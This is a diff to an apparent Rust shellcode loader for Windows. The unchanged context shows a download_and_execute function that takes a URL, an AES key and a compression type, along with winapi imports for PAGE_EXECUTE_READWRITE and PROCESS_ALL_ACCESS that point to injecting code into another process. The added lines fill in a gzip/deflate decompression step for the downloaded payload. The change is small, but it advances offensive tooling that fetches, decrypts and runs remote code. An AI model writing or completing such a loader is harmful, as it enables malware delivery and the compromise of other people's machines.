@@ -8,6 +8,9 @@ use clap::Parser;
 use std::{ptr, process::exit};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
+use flate2::read::{DeflateDecoder, GzDecoder};
+use std::io::{self, Read};
+use std::error::Error;
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -37,7 +40,26 @@ fn download_and_execute(url: String, binary:String, compression: String, aes_key
     // Decompress Shellcode
 }
 
-fn decompress() {}
+fn decompress(data: &[u8], compression_algorithm: &str) -> Result<Vec<u8>, Box<dyn Error>> {
+    let mut decompressed_data = Vec::new();
+
+    match compression_algorithm {
+        "deflate9" => {
+            let mut decompressor = DeflateDecoder::new(data);
+            decompressor.read_to_end(&mut decompressed_data)?;
+        }
+        "gzip" => {
+            let mut decompressor = GzDecoder::new(data);
+            decompressor.read_to_end(&mut decompressed_data)?;
+        }
+        _ => {
+            // If compression algorithm is not recognized, return the original data
+            decompressed_data.extend_from_slice(data);
+        }
+    }
+
+    Ok(decompressed_data)
+}
 
 fn decrypt(ciphertext: &[u8], aes_key: &[u8], aes_iv: &[u8]) -> Result<Vec<u8>, &'static str> {
     // Choose the AES type based on the key length (128 or 256 bits)
